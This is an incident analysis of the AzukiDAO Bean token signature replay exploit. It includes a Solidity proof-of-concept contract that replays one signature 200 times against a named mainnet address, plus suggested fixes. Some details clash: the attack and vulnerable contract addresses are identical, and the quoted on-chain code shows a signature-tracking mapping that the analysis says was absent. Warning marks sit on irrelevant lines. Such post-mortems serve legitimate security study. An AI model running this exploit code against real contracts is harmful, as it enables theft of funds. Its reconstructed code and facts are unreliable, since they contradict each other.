# AzukiDAO Signature Replay Vulnerability Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | AzukiDAO (Bean Token) |
| Date | 2023-07-01 |
| Chain | Ethereum Mainnet |
| Loss | ~$69,000 USD |
| Attack Type | Signature Replay |
| CWE | CWE-347 (Improper Verification of Cryptographic Signature) |
| Attacker Address | `0x85d231c204b82915c909a05847cca8557164c75e` |
| Attack Contract | `0x8189afbe7b0e81dae735ef027cd31371b3974feb` |
| Vulnerable Contract | `0x8189afbe7b0e81dae735ef027cd31371b3974feb` |
| Fork Block | 17,593,308 |

## 2. Vulnerability Code Analysis

Bean Token's `claim()` function did not prevent reuse of the same signature. Without a nonce or bitmap to track whether a signature had already been used, it was possible to call `claim()` 200 times with the same signature.

```solidity
// Vulnerable pattern: no signature replay protection
function claim(
    address[] calldata contracts,
    uint256[] calldata amounts,
    uint256[] calldata tokenIds,
    uint256 claimAmount,
    uint256 endTime,
    bytes calldata signature
) external {
    // Vulnerable: no record of signature usage (no nonce/bitmap)
    require(block.timestamp <= endTime, "Expired");

    bytes32 messageHash = keccak256(abi.encodePacked(
        msg.sender, contracts, amounts, tokenIds, claimAmount, endTime
    ));

    // Signature is verified but there is no replay protection
    address signer = ECDSA.recover(messageHash, signature);
    require(signer == trustedSigner, "Invalid signature");

    // claimAmount paid on every call — repeated calls are possible
    _mint(msg.sender, claimAmount);
}
```

**Vulnerability**: There was no mechanism to invalidate or track used signatures, allowing infinite repeated claims with the same signature.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: ECDSA.sol
 * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.  // ❌

// ...

        InvalidSignature,  // ❌

// ...

        InvalidSignatureLength,  // ❌

// ...

        InvalidSignatureS,  // ❌

// ...

        InvalidSignatureV // Deprecated in v4.8  // ❌
```

```solidity
// File: Bean.sol
    address public signatureManager;  // ❌

// ...

    mapping(bytes => bool) public signatureClaimed;  // ❌

// ...

        address _signatureManager,  // ❌

// ...

        signatureManager = _signatureManager;  // ❌

// ...

    function setSignatureManager(address _signatureManager) external onlyOwner {  // ❌
        signatureManager = _signatureManager;  // ❌
    }
```

## 3. Attack Flow

```
Attacker [0x85d231c204b82915c909a05847cca8557164c75e]
  │
  ├─1─▶ Obtain a single valid signature (via social engineering or a publicly exposed signature)
  │
  ├─2─▶ Call Bean.claim() repeatedly (200 times)
  │      params: contracts=[AZUKI, Elemental, Beanz]
  │              amounts=[...], tokenIds=[...]
  │              claimAmount=31,250 × 10^18
  │              endTime=1,688,142,867
  │              signature=<same signature>
  │
  │      Receive 31,250 Bean tokens per call
  │      200 calls × 31,250 = 6,250,000 Bean tokens drained
  │
  └─3─▶ Convert Bean tokens → ETH to realize profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IBean is IERC20 {
    function claim(
        address[] calldata contracts,
        uint256[] calldata amounts,
        uint256[] calldata tokenIds,
        uint256 claimAmount,
        uint256 endTime,
        bytes calldata signature
    ) external;
}

contract AzukiDAOExploit {
    IBean Bean = IBean(0x8189afbe7b0e81dae735ef027cd31371b3974feb);

    // AZUKI: 0xED5AF388653567Af2F388E6224dC7C4b3241C544
    // Elemental: 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e
    // Beanz: 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949

    function testExploit(bytes calldata signature) external {
        address[] memory contracts = new address[](3);
        contracts[0] = 0xED5AF388653567Af2F388E6224dC7C4b3241C544; // AZUKI
        contracts[1] = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e; // Elemental
        contracts[2] = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949; // Beanz

        uint256[] memory amounts = new uint256[](3);
        // set amounts...

        uint256 claimAmount = 31_250 * 10**18;
        uint256 endTime = 1_688_142_867;

        // Repeat 200 calls with the same signature
        for (uint256 i = 0; i < 200; i++) {
            Bean.claim(contracts, amounts, new uint256[](3), claimAmount, endTime, signature);
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-347 (Improper Verification of Cryptographic Signature) |
| Vulnerability Type | Signature Replay Attack |
| Impact Scope | Entire Bean token supply |
| Explorer | [Etherscan](https://etherscan.io/address/0x8189afbe7b0e81dae735ef027cd31371b3974feb) |

## 6. Security Recommendations

```solidity
// Fix 1: Track used signature hashes with a bitmap
mapping(bytes32 => bool) public usedSignatures;

function claim(..., bytes calldata signature) external {
    bytes32 sigHash = keccak256(signature);
    require(!usedSignatures[sigHash], "Signature already used");
    usedSignatures[sigHash] = true;

    // Signature verification
    address signer = ECDSA.recover(messageHash, signature);
    require(signer == trustedSigner, "Invalid signature");

    _mint(msg.sender, claimAmount);
}

// Fix 2: Use per-address nonces
mapping(address => uint256) public nonces;

function claim(..., uint256 nonce, bytes calldata signature) external {
    require(nonce == nonces[msg.sender]++, "Invalid nonce");

    bytes32 messageHash = keccak256(abi.encodePacked(
        msg.sender, contracts, amounts, tokenIds, claimAmount, endTime, nonce
    ));

    address signer = ECDSA.recover(messageHash, signature);
    require(signer == trustedSigner, "Invalid signature");
    _mint(msg.sender, claimAmount);
}

// Fix 3: Use the EIP-712 standard + include chainId
bytes32 public constant DOMAIN_SEPARATOR = keccak256(abi.encode(
    keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
    keccak256("BeanToken"), keccak256("1"), block.chainid, address(this)
));
```

## 7. Lessons Learned

1. **Signature replay protection is mandatory**: When verifying signatures on-chain, used signatures must always be invalidated. Use nonces, bitmaps, or signature hash mappings.
2. **Follow the EIP-712 standard**: Using structured data signing (EIP-712) embeds the chainId and contract address into the signature, preventing cross-chain and cross-contract replay attacks.
3. **Claim caps**: Adding logic to limit the maximum amount claimable by a single address can minimize damage.
4. **Audit NFT-linked claim systems**: Claim systems based on proof of NFT ownership must have their signature verification logic audited separately.